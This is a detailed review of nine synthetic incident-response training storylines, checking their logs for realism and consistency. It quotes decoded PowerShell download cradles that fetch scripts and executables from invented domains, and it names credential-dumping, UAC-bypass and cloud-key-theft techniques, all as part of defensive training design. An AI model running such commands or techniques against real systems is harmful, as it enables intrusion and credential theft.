# Storyline review — batch 1

Reviewer stance: Tier-3 / IR lead. All 9 files read event by event: authored fields, `raw`, `native.record`, and `rawLine`. Base64 payloads were decoded to check them against the network logs.

## Summary

| id | verdict | recognised | crypto | detect | e2e | logs | one-line reason |
|---|---|---|---|---|---|---|---|
| phishing-malware | FIX | 5 | no | 4 | 3 | 4 | Sound commodity chain. Nothing in the logs ties the email attachment to the exe (no file-create / attachment hash), and a description leaks "C2". |
| usb-malware | FIX | 3 | no | 4 | 3 | 3 | The USB origin appears only in raw and prose. The native MDE card has no removable-media field or device event. No C2 or impact. |
| browser-extension | FIX | 3 | no | 4 | 3 | 4 | The chain is coherent and the decoded cradle matches the PAN domain. Nothing shows how the unpacked extension or its NativeMessagingHosts registration arrived. |
| tech-support-scam | FIX | 4 | no | 3 | 2 | 3 | No lure, no remote-peer ID and no post-session actions. SHA1 mismatch on the network row. The key facts ("caller's instruction", "caller now has control") exist only in prose. |
| cracked-software | FIX | 4 | no | 4 | 2 | 2 | Impossible: a `/ru SYSTEM` task is created from a Limited token. The svchelper.exe drop is missing. The download filename appears only in prose. |
| malicious-macro | FIX | 4 | no | 4 | 2 | 2 | The decoded payload is `http://…/inv.exe` but PAN logs ssl/443. MDO shows a Malware verdict yet Delivered. The inv.exe outcome is never shown. |
| insider | FIX | 5 | no | 4 | 3 | 2 | Strong concept (departing-employee theft), but 11/15 rows have null native. Counts live only in prose. The HR file is copied before it is accessed. |
| impossible-travel | FIX | 5 | no | 2 | 3 | 4 | Good native records but no alert row at all (Entra risk = none). No credential-origin event and no VPN-tunnel activity. |
| phishing | FIX (major) | 4 | no | 4 | 2 | 2 | Too many techniques at once. The decoded C2 domain ≠ the DNS/FW domain. Sysmon/MDE/AD IDs contradict each other (PID, SID, LogonId, hash, sAMAccountName). The credential dump leads nowhere. |

---

## phishing-malware — "Phishing Attachment → Malware Execution → Workstation Compromise" (foundation)

- **Verdict:** FIX (minor)
- **Recognised:** 5. T1566.001 → T1204.002 → T1071.001. A shipping/delivery lure with a ZIP holding a `.pdf.exe` double extension is the textbook commodity-loader delivery (AgentTesla, Formbook, Qakbot-era lures).
- **Crypto:** no
- **Detectable:** 4. The real first signals are present:
  - the PAN URL-filtering THREAT/url log for `newly-registered-domain` (evt_pm_03);
  - the MDE AV alert "Malware was prevented" (evt_pm_04).

  The email row (evt_pm_01) is delivered clean (`ThreatTypes:""`). That is realistic (a miss), but it means the email is context, not an alert. The native process row (evt_pm_02) is plain DeviceProcessEvents telemetry. The CrowdStrike "double extension" detection exists only in `raw`, so the trainee never sees it.
- **End-to-end:** 3. Path: 01 (email, user) → 02 (host WS-HR-1182, hash b233…) → 03 (src 10.10.40.63 / srcuser / src_host) → 04 (same hash).

  Missing links:
  - (a) No event connects the ZIP to the exe. There is no EmailAttachmentInfo with a SHA256, no FileCreated for the extracted exe, and the link is by name only (`Delivery_Notice_48213.zip` vs `.pdf.exe`).
  - (b) Nothing ties the process to the PAN session. There is no DeviceNetworkEvents row from PID 11760 to 185.220.101.204; only host IP time-correlation.
  - (c) No scope. Were other recipients hit (same NetworkMessageId or sender)? Did anything persist, or run during the 3 minutes before the kill?
- **Log reliability:** 4.
  - evt_pm_04: the description says "after it had already executed and contacted the C2 domain". That is a conclusion ("C2") on an attack row.
  - evt_pm_04 native: `ThreatFamily:null`. A Defender AV detection always carries a threat name (e.g. `Trojan:Win32/…`).
  - Process PID: raw 6624 vs native 11760. Not visible to trainees, but the authored `process.pid` is wrong for the render.
  - 185.220.101.0/24 is a well-known Tor-exit range. Unusual as malware C2, and reused across stories (see cross-cutting).
- **Fixes:**
  - Add `EmailAttachmentInfo` (or MDE FileCreated in Downloads/Temp, with `FileOriginReferrerUrl`/ZIP path) carrying SHA256 b233…, so the email-to-file pivot works.
  - Add a DeviceNetworkEvents row: Delivery_Notice_48213.pdf.exe → 185.220.101.204:443, `RemoteUrl` shiptrack-updates-net.xyz.
  - evt_pm_04: set `ThreatFamily`/Title to a real Defender name. Reword the description to "…after the process had connected to shiptrack-updates-net.xyz".
  - Optional: add a second recipient row with the same `InternetMessageId` for scoping.

## usb-malware — "Malicious USB Drive → Trojan Persistence → Workstation Compromise" (foundation)

- **Verdict:** FIX
- **Recognised:** 3. T1091 / T1204.002 / T1547.001. USB-borne malware is real (Raspberry Robin, USB worms in OT/finance). "An unsigned exe on a found stick" is generic, though, and the real USB families (Raspberry Robin: LNK → cmd → msiexec over HTTP) look quite different.
- **Crypto:** no
- **Detectable:** 4. The MDE AV alert (evt_usb_04) is present. The CrowdStrike "removable media execution" detection exists only in raw.
- **End-to-end:** 3. Path: 01 (file create, hash e5f7…) → 02 (execution, same hash) → 03 (Run key, InitiatingProcess hash) → 04 (quarantine).

  Missing:
  - (a) Proof the file came from USB is not in the native card. MDE DeviceFileEvents has no source volume, and there is no `DeviceEvents` `UsbDriveMounted`/`PnpDeviceConnected` row. The serial `07A3F9C1` and `E:\` exist only in raw.
  - (b) No network activity or C2, and no second host (USB = spread vector). Scope cannot be assessed.
  - (c) Whether the Run key was cleaned is stated in prose, not in any log.
- **Log reliability:** 3.
  - evt_usb_01: the core evidence (`file.source_volume_type: removable`) is raw-only. The native card shows only "explorer.exe created a file on the Desktop", which is indistinguishable from a normal copy.
  - evt_usb_04: the description says "the analyst must confirm and clean up" (coaching in the log line). The AV evidence row's `Categories:["Persistence"]` / T1547.001 on a file quarantine is odd; AV detections map to the file, not to the Run key.
- **Fixes:**
  - Add an MDE `DeviceEvents` row before evt_usb_01: `ActionType: UsbDriveMounted`, `AdditionalFields` {DriveLetter "E:", ProductName, SerialNumber 07A3F9C1, Manufacturer}.
  - Optionally add `PnpDeviceConnected`.
  - Add one `DeviceNetworkEvents` beacon from USB_Backup_Tool.exe, so containment has an IOC beyond the hash.
  - Move the "confirm cleanup" guidance out of the description into the debrief.
  - Re-map the evt_usb_04 AlertEvidence category to Malware/Execution.

## browser-extension — "Sideloaded Browser Extension → Native-Messaging Host → PowerShell" (foundation)

- **Verdict:** FIX
- **Recognised:** 3. T1176.001, T1059.003/.001, T1071.001.
  - Malicious extensions are a mainstream incident class (ChromeLoader/Choziosi used `--load-extension` from a user folder; the Cyberhaven 2024 extension compromise).
  - The native-messaging → cmd → PowerShell bridge is documented but rarer. It is an advanced pattern for a "foundation" story.
- **Crypto:** no
- **Detectable:** 4.
  - The MDE alert "Suspicious PowerShell activity" (evt_bext_05) and the PAN NRD URL alert (evt_bext_04) are present.
  - The decoded cradle `IEX(…DownloadString('https://cdn-assets-update.xyz/b.ps1'))` matches the PAN `misc` domain. Good: the pivot works.
- **End-to-end:** 3. Path: 01 (chrome `--load-extension`) → 02 (chrome → cmd host .cmd, ext id) → 03 (cmd → encoded PS) → 04 (host IP → NRD domain) → 05 (kill).

  Missing:
  - (a) How `perf_boost_ext_unpacked` got into Downloads. No browser download or proxy row, and no FileCreated.
  - (b) A native-messaging host only works if `HKCU\Software\Google\Chrome\NativeMessagingHosts\<name>` points at a manifest. There is no registry event, so the launch in evt_bext_02 is causally impossible in the data.
  - (c) What b.ps1 did. 40 KB came back at 09:02:30 and the kill was at 09:04, with no child processes, file writes or connections in between.
  - (d) Who relaunched Chrome with the flag. The parent is explorer.exe; was it a planted shortcut?
- **Log reliability:** 4.
  - evt_bext_05 native: `DetectionSource: "Antivirus"` on a behavioural "Suspicious PowerShell activity" alert should be `EDR`.
  - Real Chrome NM-host launches include `--parent-window=0` and the `\\.\pipe\chrome.nativeMessaging…` redirection in the cmd line. Minor.
  - Descriptions are neutral. ("download-cradle chain" in evt_bext_05 is acceptable as the product's verdict.)
- **Fixes:**
  - Add a DeviceFileEvents row for `perf_boost_ext_unpacked\manifest.json` (or a ZIP from a browser download with `FileOriginUrl`).
  - Add DeviceRegistryEvents `RegistryValueSet` for `HKCU\Software\Google\Chrome\NativeMessagingHosts\com.perfboost.host` → `…\host\manifest.json`, with the writing process shown (e.g. a `setup.cmd` run by the user). This is the real persistence and root cause.
  - Add a post-download row (e.g. PS writes `%TEMP%\…` or makes a second connection), or state through a log that nothing ran.
  - evt_bext_05: change `DetectionSource` to `EDR`.

## tech-support-scam — "Tech-Support Scam → Unapproved Remote Access Tool" (foundation)

- **Verdict:** FIX
- **Recognised:** 4. T1219.002. Tech-support or help-desk vishing leading to a legitimate RMM (AnyDesk, Quick Assist, ScreenConnect) is extremely common: Storm-1811 / Black Basta Teams vishing, and CISA AA23-025A on RMM abuse.
- **Crypto:** no
- **Detectable:** 3.
  - The MDE PUA alert "'AnyDesk' unwanted software was prevented" (evt_rat_05) is realistic.
  - But Defender PUA blocks on write or execute, not 6 minutes later after a live session. The timing contradicts the product.
  - In practice the first signal is often a network or "unsanctioned RMM" detection. The relay connection (evt_rat_03) is plain telemetry.
- **End-to-end:** 2. Path: 01 (chrome writes AnyDesk.exe) → 02 (exec) → 03 (net to relay) → 04 (cmd enumeration) → 05 (kill).

  Missing:
  - (a) The lure. No scareware page, pop-up URL or Teams/phone record. `FileOriginUrl`/`FileOriginReferrerUrl` is null although MDE populates it for browser downloads (MOTW), and that is the key pivot to the scam site.
  - (b) The remote party. There is no AnyDesk peer ID or remote IP (AnyDesk `ad.trace`/`connection_trace.txt` or the relay logs give the incoming ID).
  - (c) What the operator did. An accounting user (WS-ACC) implies banking or BEC fraud, file transfer, or an AnyDesk `--install` service for persistence; none is shown.
  - (d) The "hands-on-keyboard" link from evt_rat_04 to the session is time-only. The parent is explorer.exe, indistinguishable from the user.
- **Log reliability:** 3.
  - evt_rat_03 native: `InitiatingProcessSHA1: 2c982a37…` ≠ AnyDesk.exe SHA1 `92b73c45…` in 01/02/05, and `InitiatingProcessSHA256: null`. This breaks the hash pivot.
  - evt_rat_02 description: "at the caller's instruction" is evidence only in prose.
  - evt_rat_03 description: "the caller now has interactive control of the desktop" is a conclusion.
  - evt_rat_05 description: "hands-on-keyboard enumeration" is a conclusion.
  - The relay hostname: real AnyDesk relays are `relay-<hex>.net.anydesk.com`, usually on 80/443/6568.
- **Fixes:**
  - evt_rat_01: set `FileOriginUrl` to `https://download.anydesk.com/AnyDesk.exe` and `FileOriginReferrerUrl` to a scam page (e.g. `https://ms-support-alert[.]live/…`).
  - Add a proxy/PAN row to that scam page a few minutes earlier.
  - evt_rat_03: fix SHA1/SHA256 to match the file, use a `relay-xxxx.net.anydesk.com` RemoteUrl, and neutralise the description.
  - Add one row carrying the remote AnyDesk ID/IP (an AnyDesk trace file read, or a FileCreated `connection_trace.txt` with the content summarised in `AdditionalFields`).
  - Add one impact row (file transfer via AnyDesk, or browser to the banking portal), so the containment/notification decision is grounded.
  - evt_rat_05: move the PUA block to execution time, or relabel it as a behavioural EDR alert.

## cracked-software — "Cracked Software Installer → Scheduled Task Persistence" (foundation)

- **Verdict:** FIX
- **Recognised:** 4. Malvertising or cracked-software "activators" delivering infostealers/loaders (Lumma, RedLine, Vidar via fake KMS activators) is one of the most common workstation incidents. T1204.002, T1053.005, T1583.008 (malvertising).
- **Crypto:** no
- **Detectable:** 4. The MDE AV alert `'Wacatac' malware was prevented` (evt_crack_05) is present and realistic. The schtasks creation is telemetry only. A "suspicious scheduled task" EDR alert would also be realistic.
- **End-to-end:** 2. Path: 01 (PAN, domain) → 02 (exec, hash 7ba5…) → 03 (schtasks child, same parent) → 04 (task fires, hash 7709…) → 05 (quarantine).

  Missing:
  - (a) Who wrote `C:\ProgramData\OfficeTools\svchelper.exe`. Hash 7709… first appears when the task runs, with no FileCreated.
  - (b) That the installer came from that domain. The PAN row has no filename, and there is no FileCreated with `FileOriginUrl`.
  - (c) The payload's behaviour. These families steal browser credentials and exfiltrate within seconds: no browser credential-DB reads, no C2 or exfil connection. Impact and scope (which credentials to reset) cannot be decided.
- **Log reliability:** 2.
  - evt_crack_03: `schtasks /create … /ru SYSTEM` from a process at `ProcessIntegrityLevel: Medium`, `TokenElevationTypeLimited`. Creating a SYSTEM task needs admin, so this fails with "Access is denied". evt_crack_04 then runs as SYSTEM, which is impossible as authored.
  - evt_crack_03 native: `InitiatingProcessSHA1: 6f844056…` ≠ the installer's SHA1 `e0459b61…` (evt_crack_02), and `InitiatingProcessSHA256: null`. Hash pivot broken.
  - evt_crack_01: the description carries "downloaded Office_Pro_2026_Activator_Setup.exe … following a sponsored search result click". Neither the filename nor the ad click is in the record. The URL log `misc` is just `fast-office-tools-download.top/`, and the category `computer-and-internet-info` / low-risk gives no signal.
  - evt_crack_05: "as a known trojan". `Wacatac.B!ml` is a generic ML verdict, not a known family. Minor.
- **Fixes:**
  - evt_crack_02/03: make the installer elevated (add a `consent.exe` UAC prompt; `ProcessIntegrityLevel: High`, `TokenElevationTypeFull`). Or drop `/ru SYSTEM` and run the task as y.golan (then evt_crack_04 runs as the user, Medium).
  - Add a DeviceFileEvents row: installer writes `C:\ProgramData\OfficeTools\svchelper.exe` (SHA256 7709…).
  - Add a DeviceFileEvents row: chrome writes the installer to Downloads, with `FileOriginUrl https://fast-office-tools-download.top/…/Office_Pro_2026_Activator_Setup.exe` and `FileOriginReferrerUrl` = a search-ad redirect.
  - Add a PAN THREAT/file row (`Windows Executable (EXE)`, filename), or change the URL category to something with signal.
  - Fix the evt_crack_03 InitiatingProcess hashes.
  - Add svchelper.exe → (a) `FileOpen` of `…\Chrome\User Data\Default\Login Data`, (b) an outbound POST to a C2. Then the trainee must reset browser-stored credentials.

## malicious-macro — "Malicious Office Macro → PowerShell Execution" (foundation)

- **Verdict:** FIX
- **Recognised:** 4. T1566.001 / T1204.002 / T1059.001. Macro downloader (Emotet/Donoff/Qakbot) is canonical, but dated: Office has blocked internet macros (MOTW) by default since 2022, which the story should acknowledge (e.g. a file saved from a trusted location, or an older Office build). It also overlaps heavily with phishing-malware and with the first half of `phishing`.
- **Crypto:** no
- **Detectable:** 4. The MDO detonation verdict (Donoff), the PAN NRD alert and the MDE alert are all present.
- **End-to-end:** 2. Path: 01 (email, docm name) → 02 (WINWORD → PS) → 03 (host IP → domain) → 04 (docm quarantined).

  Missing:
  - (a) The decoded command is `Invoke-WebRequest -Uri http://invoice-sync-cdn.xyz/inv.exe -OutFile $env:TEMP\inv.exe`, but there is no FileCreated for `%TEMP%\inv.exe`, no execution, and no statement that it never ran. The key scoping question is unanswerable.
  - (b) No attachment hash. evt_macro_04 native has `SHA256: null`, and there is no EmailAttachmentInfo, so email ↔ file ↔ other mailboxes cannot be pivoted.
  - (c) No other recipients.
- **Log reliability:** 2.
  - evt_macro_02 vs 03: the payload uses `http://` (TCP/80, app `web-browsing`), but PAN logs `app ssl`, `dport 443`. A direct contradiction.
  - evt_macro_01 native: `ThreatTypes: Malware`, `ThreatNames: TrojanDownloader:O97M/Donoff!MTB`, `DetectionMethods: File detonation`, yet `DeliveryAction: Delivered`. An ETR allow (`OrgLevelPolicy: Exchange transport rule`) does not bypass MDO malware filtering.
  - evt_macro_01 raw says the opposite: `block.reason: "No matching transport rule"`.
  - evt_macro_04: "Emotet-variant" / `Trojan.Emotet-variant` is not a vendor naming. Native `ThreatFamily: null`, `SHA256: null`.
  - evt_macro_02 description: "opened … and enabled content" is prose-only. Acceptable at foundation level.
- **Fixes:**
  - Change the decoded URL to `https://…`, or change the PAN row to `app web-browsing`, `dport 80`, and the URL log with `misc invoice-sync-cdn.xyz/inv.exe`.
  - evt_macro_01: deliver clean (`ThreatTypes ""`). Then add an `EmailPostDeliveryEvents` ZAP row (`ActionType: Malware ZAP`, `ThreatTypes: Malware`) after detonation. This is the realistic "delivered, then caught" pattern.
  - Add `EmailAttachmentInfo` with a SHA256 and reuse it in evt_macro_04.
  - Add `%TEMP%\inv.exe` FileCreated (plus either its execution or an AV block).
  - evt_macro_04: use a real Defender name (`TrojanDownloader:O97M/Donoff`) and fill the SHA256.

## insider — "Bulk Finance Downloads and Removable Media — WS-FIN-4421" (core)

- **Verdict:** FIX
- **Recognised:** 5. Departing-employee data theft. It maps one-to-one to the Purview Insider Risk "Data theft by departing users" template (HR connector + exfil indicators) and CERT insider-threat cases. T1213.002 (SharePoint), T1052.001, T1567 / T1048.
- **Crypto:** no
- **Detectable:** 4. The DLP alert (evt_03), the UEBA anomaly (evt_insider_ueba_alert) and the Zscaler DLP block (evt_06) are present.
- **End-to-end:** 3. Path: HR termination (evt_00) → logon (01) → SharePoint downloads (02, 03, UEBA) → USB (04, 05) → print → cloud-upload block (06) → personal email (07) → HR-site access (08) → job sites (09) → USB removed (09b) → logoff (10).

  Strong narrative. Breaks:
  - (a) Headcount_Reduction_Plan_Nov26.xlsx is copied to USB at 13:31 (evt_05) and printed at 13:33, but the HR SharePoint access is only at 13:55 (evt_08). The file is exfiltrated before it is obtained.
  - (b) Employee_Salary_Master_2026.xlsx and payroll/bonus files have no download row. The only downloaded filename shown is Q2-Vendor-Payments.xlsx. File provenance can't be proved.
  - (c) The Zscaler block has no filename (`filetype None`), so you can't tell what was attempted.
- **Log reliability:** 2.
  - 11 of 15 rows have `native: null` (Workday, 4624/4634, every Purview row, every CrowdStrike USB row). Purview/SharePoint should render as O365 Management Activity (`FileDownloaded`, `DlpRuleMatch`, `PolicyDetails`, `SensitiveInformation`). Exchange DLP and endpoint-DLP print/USB have native Purview schemas.
  - Counts live only in prose:
    - evt_02 "12 files in 3 minutes" (raw is one file);
    - evt_04 "47 files copied within 23 seconds" (raw is a mount event only, yet `severity: critical`);
    - evt_05 "8 more files" (raw is one file);
    - baseline "11 files over 8 hours" (no count).
  - evt_03: a "bulk download" rule is not a Purview DLP construct. DLP evaluates content per action. Mass download is an MDCA policy ("Mass download by a single user") or a Purview IRM indicator.
  - evt_04/05: `RemovableMediaConnected` and `FileWrittenToRemovableMedia` should be checked against real Falcon event names (`DcUsbDeviceConnected`, `RemovableMediaVolumeMounted`, …). The USB serial `SanDisk-A3F7B2C1` is not a real serial format.
  - evt_01: a LogonType 2 (interactive) with `IpAddress 10.10.20.91`. Interactive logons record `127.0.0.1` or `-`.
  - Descriptions are neutral. Good.
- **Fixes:**
  - Move evt_08 (HR site access) before 13:30, or drop Headcount_Reduction_Plan from evt_05 and the print row.
  - Render evt_02/03/07/08/print as native O365/Purview records (`FileDownloaded` with `SourceFileName`, `SiteUrl`, `ClientIP`; `DlpRuleMatch` with `PolicyDetails`/`SensitiveInformation` counts).
  - Turn evt_03 into either an MDCA "Mass download" alert or a Purview IRM alert ("Data theft by departing users", triggered by evt_00).
  - Put counts into fields: `file.count`, or emit several FileDownloaded / file-to-USB rows. Include download rows for the salary/payroll files.
  - Give evt_04/05 an MDE/Falcon native card (`UsbDriveMounted`; `FileCreated` on `E:\Finance_Backup\` with SHA256 matching the downloaded file).
  - Add a filename to the Zscaler row.

## impossible-travel — "Account Compromise — Impossible Travel" (core)

- **Verdict:** FIX
- **Recognised:** 5. Valid-account compromise detected by impossible travel (T1078), then a mailbox forwarding rule (T1114.003) and SharePoint data theft. This is the standard MDCA / Entra ID Protection BEC-precursor pattern.
- **Crypto:** no
- **Detectable:** 2. No row is an alert. The Entra sign-in (evt_imp_03) has `riskLevelDuringSignIn: none`, `riskEventTypes_v2: []`, `conditionalAccessStatus: notApplied`. The GlobalProtect rows are plain connects. In reality, MDCA "Impossible travel activity" / Entra "atypical travel", and MDCA "Suspicious inbox forwarding", would fire. The trainee has to spot it unaided in a noisy feed.
- **End-to-end:** 3. Path: baseline VPN TLV (01) → VPN Lagos 4 min later (02, user plus geo) → Entra password-only sign-in, same IP (03) → forwarding rule, same IP (04) → SharePoint download, same IP (05). The IP pivot works well.

  Missing:
  - (a) Credential origin. No phishing click, AiTM, password spray or failed-logon history.
  - (b) The VPN session (tunnel IP 10.100.50.77) is the bigger risk, but no internal traffic from it is logged, so internal scope cannot be determined.
  - (c) The VPN auth record. GP `auth_method` is blank in native, there is no Entra/SAML sign-in at 07:04, and "no MFA" exists only in raw.
  - (d) evt_05 claims 847 files (2.3 GB), but the record is one FileDownloaded.
- **Log reliability:** 4.
  - evt_imp_05 description: the count/volume is prose-only.
  - evt_imp_05 UserAgent: Edge/129 on Windows, vs evt_imp_03 Chrome/140. Two browsers in the same attacker session from the same IP, a small contradiction.
  - evt_imp_02: the unregistered-device and MFA-not-required facts are raw-only. Native shows only `machinename DESKTOP-59E61E5` and an empty `serialnumber`.
  - evt_imp_04 native is good (RecordType 1, ClientIP:port, ForwardTo).
  - MITRE: T1530 for SharePoint → T1213.002 is the better fit.
- **Fixes:**
  - Add an alert row: an MDCA "Impossible travel activity" alert (or Entra risk detection `impossibleTravel`/`unfamiliarFeatures`, `riskLevelDuringSignIn: high`) on evt_03.
  - Add an MDCA "Suspicious inbox forwarding" alert for evt_04.
  - Add the Entra SAML sign-in for the GlobalProtect app at 07:04 (single factor), so "no MFA on VPN" is in a log.
  - Add 1–2 PAN TRAFFIC rows from 10.100.50.77 to internal servers (or an explicit "no traffic" outcome).
  - Add a credential-origin row, e.g. a phishing click days earlier, or Entra failed sign-ins from 41.203.64.0/24.
  - Emit several FileDownloaded rows, or an MDCA "Mass download" alert with a count.
  - Align the evt_05 UserAgent with evt_03.

## phishing — "Phishing → Cloud Exfiltration" (advanced)

- **Verdict:** FIX (major). If the fixes can't be made, trim to: email → macro → PS → beacon → AWS-key theft → S3 GetObject.
- **Recognised:** 4.
  - Each step is real: macro loader, Run key, ms-settings/computerdefaults UAC bypass (T1548.002), comsvcs MiniDump (T1003.001), `.aws\credentials` theft (T1552.001), access-key abuse (T1078.004), BEC-style inbox rule (T1564.008).
  - As one storyline it is a kitchen sink of 15 techniques with three goals (credential dumping, BEC rule-hiding, S3 theft) that never connect.
- **Crypto:** no
- **Detectable:** 4. Plenty of genuine first alerts are visible in native:
  - the MDO Donoff verdict;
  - Entra high-risk sign-in (evt_10, `riskEventTypes_v2: unfamiliarFeatures`).

  The CrowdStrike LSASS detection is raw-only; native evt_09 is plain DeviceProcessEvents.
- **End-to-end:** 2. Intended path: email (02, IP 91.108.56.199) → WINWORD (03) → PS (04) → DNS (dns_c2) → FW (fw_c2) → DLL (06) → Run key (07) → DNS TXT (08) → UAC bypass (08b) → LSASS (09) → RC4 TGT (09b) → SMB (05) → 4624 on FS (09c) → Entra Amsterdam (10, 91.108.56.122, same /24 as the sender) → inbox rule (11) → `.aws\credentials` read (11b) → STS (11c) → S3 (12).

  Breaks:
  - (a) The decoded evt_04 command is `IEX(…DownloadString('http://cdn-msupdate-sync.com/s.ps1'))`, but DNS (dns_c2, 08) resolves `cdn-update-fb76.xyz`, and the FW row is ssl/443 while the payload is http/80. The pivot from the PowerShell command to network IOCs is broken.
  - (b) The LSASS dump has no payoff. The next steps use j.smith's own account, and an RC4 TGT for your own user from your own workstation adds nothing.
  - (c) How the attacker got j.smith's cloud password for evt_10 is unexplained. An LSASS dump yields NTLM hashes, not the cleartext Entra password, and nothing in the logs harvests a password.
  - (d) The rundll32 process reading `.aws\credentials` (11b) is never started in the logs. The Run key fires only at logon, and there is no `rundll32 svchost32.dll` process row.
  - (e) Lateral SMB to FS-CORP-01 does nothing: no 5140/5145, no file access, no service. It has no role in the outcome.
- **Log reliability:** 2. Cross-source identifiers for the same host and session contradict each other:
  - PowerShell PID: Sysmon 5512 vs MDE 5436.
  - WINWORD PID: 4128 vs MDE InitiatingProcessId 7212.
  - User SID: Sysmon/AD `S-1-5-21-3421479547-…-1103` vs MDE `S-1-5-21-1576910179-…-6427`.
  - LogonId: 4624 `0x8F4A21`, Sysmon `0xC07C65`, MDE 7605937. TerminalSessionId 3 vs 1.
  - WINWORD SHA256: Sysmon `1E1BB3…`, MDE `cfbb66…`, CS raw `88fa52…`.
  - The powershell ProcessGuid differs between dns_c2/07 (`{a1b2c3d4-…-0001…}`) and 08b's ParentProcessGuid.

  Time and logic contradictions:
  - fw_c2: the session `start 09:47:39` is before the DNS resolution at 09:47:42.
  - evt_05/09c: the SMB session ends at 10:06:30 (`start 10:06:03`, `elapsed 27`), but the 4624 on FS-CORP-01 is at 10:07:00, and IpPort 54803 ≠ sport 49851.
  - PAN `app msrpc-base` on 445 should be `ms-ds-smbv3`.
  - evt_08b: the computerdefaults `FileVersion 10.0.22621` (Windows 11) vs the host OS Windows 10 22H2 build 19045.
  - evt_09b/09c: `TargetUserName j.smith` vs sAMAccountName `jsmith` everywhere else.
  - evt_02 native: Malware verdict but Delivered via ETR (same issue as malicious-macro).

  Rows that are null or invented:
  - native null on 01, 09b, 09c, 11b, outcome_lock.
  - evt_phish_outcome_lock: "Identity Protection raised risk", but raw has actor `it-security@nexacorp.com` from 10.10.1.5 doing "Set user risk level" with an invented `RiskDetected_FirstTimeCountry`. Identity Protection is not an admin audit operation.
  - evt_08 TXT answer decodes to `recv 475 bytes data` (cartoonish). A single TXT query is not evidence of DNS tunnelling (volume is).
  - evt_12: T1567.002 is wrong for GetObject from the victim's bucket (that is T1530). `requestParameters: null`, where a real GetObject has bucketName/key.
  - evt_phish_baseline_01: the baseline sign-in has `riskState: atRisk`, `unfamiliarFeatures`, which makes the baseline look suspicious.

  Conclusions in descriptions:
  - evt_08b "the beacon's PowerShell process";
  - evt_11b "The beacon … read";
  - evt_09 opens with "CrowdStrike detected…" while the card renders MDE.
- **Fixes:**
  1. Re-encode evt_04 to `https://cdn-update-fb76.xyz/s.ps1` (or rename the DNS/TXT domain to match), and keep fw_c2 on 443. Set the fw_c2 `start` after 09:47:42.
  2. Normalise identifiers across Sysmon/MDE/AD for WS-FIN-2847: one user SID and sAMAccountName (`jsmith`) in 4624/4768/4624-FS, one LogonId, and the same PIDs, ProcessGuids and WINWORD hash. Or render the host from a single EDR product.
  3. Add the evt_08b precursor: Sysmon 13 `HKU\…\Software\Classes\ms-settings\Shell\Open\command` (+ `DelegateExecute`) set by PowerShell. Fix the computerdefaults FileVersion to a Win10 build.
  4. Make the credential dump matter. Either (a) the dump yields a privileged account (e.g. `svc-backup`/IT admin), and evt_09b/09c/05 use that account (RC4 TGT for *that* account = overpass-the-hash), with an action on FS-CORP-01 (5145 share access to `\\FS-CORP-01\Finance$`). Or (b) delete 09/09b/05/09c.
  5. Explain the cloud password. Add a credential-harvest row (e.g. a fake M365 login page in the email or a later click, or a browser-credential read by the beacon), or drop evt_10/11 and keep the AWS-key path only.
  6. Add an MDE/Sysmon process row `rundll32.exe svchost32.dll,DllMain` before 11b. Give 11b a native card (`FileOpen`/Sysmon 11-style) and neutralise "The beacon".
  7. Replace evt_phish_outcome_lock with a real Entra ID Protection `riskDetection` (`riskEventType: unfamiliarFeatures`/`anonymizedIPAddress`, `detectionTimingType: realtime`), or remove it.
  8. Set evt_12 MITRE to T1530. Fill `requestParameters {bucketName, key}`.
  9. evt_08: emit a burst (or an Infoblox/DNS analytics "high-entropy subdomain" alert) with realistic encoded labels. Drop the plaintext-decoding answer.
  10. Baseline sign-in: `riskState none`, `riskEventTypes_v2 []`.
  11. evt_05: `app ms-ds-smbv3`; align the FS 4624 to inside the session window and match the source port.
  12. evt_02: deliver clean, then add an MDO ZAP row (as in malicious-macro).

---

## Cross-cutting observations

1. **Re-homing to MDE drops the detections.** Authored attack rows put the evidence of detection in CrowdStrike/SentinelOne `raw` (`detection.description`, `scenario`, `behaviors`, severity). The rendered `native` card is usually bare MDE `DeviceProcessEvents`/`DeviceFileEvents` telemetry.
   - Consequence: in most foundation stories the first real alert the trainee sees is the final AV "…was prevented" row, after the fact.
   - AlertEvidence rows often have `ThreatFamily:null`, `SHA256:null`, and `DetectionSource: Antivirus` on behavioural alerts.
   - Descriptions still name the authored vendor ("CrowdStrike Falcon killed…", "SentinelOne killed…", "CrowdStrike detected…") while the card shows Microsoft Defender.
   - Fix: emit an MDE `AlertInfo`/`AlertEvidence` alert row at the first real detection point, and make descriptions vendor-neutral or re-homed.
2. **Pivot-breaking identifier and IOC inconsistencies.**
   - InitiatingProcess hashes that don't match the file (tech-support evt_rat_03, cracked evt_crack_03).
   - Decoded payload URLs that don't match the network logs (phishing domain; http vs ssl/443 in phishing and malicious-macro).
   - Mixed Sysmon/MDE/AD renders of one host with different PIDs/SIDs/LogonIds/hashes and `jsmith` vs `j.smith` (phishing).
   - Time-order slips (FW session before DNS; FS logon after SMB session end; HR file copied before it is accessed).
   - Hash/IP/user pivots are the core skill being trained, so these must be validated automatically: decode `-EncodedCommand` and check its host against the DNS/FW rows; check the hash chain across rows; check monotonic causality.
3. **Many foundation stories are near-identical and miss the start and end of the investigation.**
   - phishing-malware, usb-malware, cracked-software, malicious-macro and browser-extension all reduce to "user runs file → (NRD beacon) → AV kill".
   - The delivery link is missing (no `FileOriginUrl`/referrer, no `EmailAttachmentInfo` hash, no USB-mount event, no NativeMessagingHosts registry).
   - Post-execution scope is missing (what ran in the minutes before the kill, other recipients or hosts).
   - Key facts live only in prose: "caller's instruction", "sponsored search result", "12/47/847 files".
   - The same infrastructure recurs: 185.220.101.0/24 (a public Tor-exit range) as C2 in three stories, 45.148.10.x senders, identical PAN rule/serial/NAT. Trainees can pattern-match without analysing.
   - Also: MDO rows showing a Malware verdict yet `Delivered` (phishing, malicious-macro) teach a filtering behaviour that doesn't exist; use delivered-clean + ZAP instead.
   - None of the 9 storylines is crypto-themed.
